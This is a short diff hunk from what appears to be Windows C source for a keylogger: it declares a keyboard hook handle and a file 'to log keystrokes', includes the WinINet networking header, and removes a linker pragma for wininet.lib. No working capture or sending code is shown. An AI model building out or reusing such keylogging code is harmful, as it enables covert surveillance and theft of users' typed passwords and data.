@@ -3,7 +3,7 @@
 #include <windows.h>
 #include <wininet.h>
 #include "native.h"
-#pragma comment(lib, "wininet.lib")
+
 HHOOK hHook;
 FILE *logFile = NULL; // File to log keystrokes
 
